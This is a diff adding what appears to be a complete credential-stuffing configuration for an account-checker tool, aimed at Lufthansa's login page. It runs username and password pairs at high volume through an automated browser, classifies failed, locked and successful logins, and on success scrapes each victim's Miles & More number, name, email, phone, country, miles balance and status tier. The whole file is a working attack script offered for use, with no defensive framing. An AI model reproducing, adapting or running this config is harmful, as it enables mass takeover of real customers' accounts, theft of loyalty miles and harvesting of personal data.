@@ -1,0 +1,168 @@
+# Lufthansa.com Account Checker - Enhanced Script
+# CPM: 200 | Bots: 200 | Threading: Enabled
+
+# Validate password length and complexity
+Length $"<PASS>" -> VAR "PS" 
+
+KeyCheck BanOnToCheck=False 
+  KEYCHAIN Failure OR 
+    KEY "<PS>" LessThan "8" 
+    KEY "<USER>" Contains $"<PASS>" 
+  KEYCHAIN Failure AND 
+    KEY "<PASS>" DoesNotContain "0" 
+    KEY "<PASS>" DoesNotContain "1" 
+    KEY "<PASS>" DoesNotContain "2" 
+    KEY "<PASS>" DoesNotContain "3" 
+    KEY "<PASS>" DoesNotContain "4" 
+    KEY "<PASS>" DoesNotContain "5" 
+    KEY "<PASS>" DoesNotContain "6" 
+    KEY "<PASS>" DoesNotContain "7" 
+    KEY "<PASS>" DoesNotContain "8" 
+    KEY "<PASS>" DoesNotContain "9" 
+
+# Open browser with stealth settings
+PuppeteerOpenBrowser 
+
+# Navigate to Lufthansa login page
+PuppeteerNavigateTo $"https://www.lufthansa.com/de/en/myaccount-login" $"" 30000 
+
+# Wait for page load
+Delay 2000 
+
+# Handle cookie consent if present
+PuppeteerClick Selector $"button[id*='cookie'], button[class*='cookie'], button[class*='consent']" 0 Left 1 1 
+  SAFE 
+
+Delay 1500 
+
+# Wait for login form
+PuppeteerWaitForElement Selector $"input[type='email'], input[name='email'], input[id*='email'], input[id*='username']" 5000 
+  SAFE 
+
+# Enter username/email
+PuppeteerTypeElementHuman Selector $"input[type='email'], input[name='email'], input[id*='email'], input[id*='username']" 0 $"<USER>" 
+
+Delay 1000 
+
+# Enter password
+PuppeteerTypeElementHuman Selector $"input[type='password'], input[name='password'], input[id*='password']" 0 $"<PASS>" 
+
+Delay 500 
+
+# Click login button
+PuppeteerClick Selector $"button[type='submit'], button[class*='login'], button[class*='submit'], input[type='submit']" 0 Left 1 1 
+
+# Wait for response
+Delay 5000 
+
+# Get page content
+PuppeteerGetDOM 
+
+# Check for invalid credentials
+KeyCheck BanOnToCheck=False 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials" 
+    KEY "incorrect password" 
+    KEY "Wrong password" 
+    KEY "Email or password is incorrect" 
+    KEY "Login failed" 
+    KEY "Authentication failed" 
+    KEY "Invalid email or password" 
+    KEY "Ungültige Anmeldedaten" 
+    KEY "Falsches Passwort" 
+
+# Check for account not found
+KeyCheck BanOnToCheck=False 
+  KEYCHAIN Failure OR 
+    KEY "account not found" 
+    KEY "user not found" 
+    KEY "no account exists" 
+    KEY "Email address not found" 
+    KEY "Konto nicht gefunden" 
+
+# Check for account locked/suspended
+KeyCheck BanOnToCheck=False 
+  KEYCHAIN Custom OR 
+    KEY "account locked" 
+    KEY "account suspended" 
+    KEY "temporarily locked" 
+    KEY "Konto gesperrt" 
+
+# Wait for dashboard to load
+Delay 3000 
+
+# Verify successful login
+PuppeteerGetDOM 
+  SAFE 
+
+KeyCheck BanOnToCheck=False 
+  KEYCHAIN Success OR 
+    KEY "Welcome" 
+    KEY "Dashboard" 
+    KEY "My Account" 
+    KEY "Profile" 
+    KEY "Logout" 
+    KEY "Sign out" 
+    KEY "Miles & More" 
+    KEY "Willkommen" 
+    KEY "Mein Konto" 
+    KEY "Profil" 
+
+# Capture Miles & More number if available
+Parse $"<SOURCE>" LR "Miles & More" "</" -> CAP "MilesAndMore" 
+  SAFE
+
+Parse $"<SOURCE>" LR "\"milesAndMore\":\"" "\"" -> CAP "MilesAndMore" 
+  SAFE
+
+# Capture member name
+Parse $"<SOURCE>" LR "Welcome" "</" -> CAP "Name" 
+  SAFE
+
+Parse $"<SOURCE>" LR "Willkommen" "</" -> CAP "Name" 
+  SAFE
+
+Parse $"<SOURCE>" LR "\"firstName\":\"" "\"" -> CAP "FirstName" 
+  SAFE
+
+Parse $"<SOURCE>" LR "\"lastName\":\"" "\"" -> CAP "LastName" 
+  SAFE
+
+# Capture email
+Parse $"<SOURCE>" LR "\"email\":\"" "\"" -> CAP "Email" 
+  SAFE
+
+# Capture miles balance
+Parse $"<SOURCE>" LR "\"milesBalance\":\"" "\"" -> CAP "MilesBalance" 
+  SAFE
+
+Parse $"<SOURCE>" LR "\"miles\":\"" "\"" -> CAP "MilesBalance" 
+  SAFE
+
+# Capture status level
+Parse $"<SOURCE>" LR "\"statusLevel\":\"" "\"" -> CAP "StatusLevel" 
+  SAFE
+
+Parse $"<SOURCE>" LR "\"tier\":\"" "\"" -> CAP "StatusLevel" 
+  SAFE
+
+# Capture membership type
+Parse $"<SOURCE>" LR "\"membershipType\":\"" "\"" -> CAP "MembershipType" 
+  SAFE
+
+# Capture country
+Parse $"<SOURCE>" LR "\"country\":\"" "\"" -> CAP "Country" 
+  SAFE
+
+# Capture phone number
+Parse $"<SOURCE>" LR "\"phone\":\"" "\"" -> CAP "Phone" 
+  SAFE
+
+Parse $"<SOURCE>" LR "\"phoneNumber\":\"" "\"" -> CAP "Phone" 
+  SAFE
+
+# Capture configuration author
+ConstantString $"legendhkek" -> CAP "ConfigBy"
+
+# Rate limiting delay (CPM 200 = 300ms per check)
+Delay 300
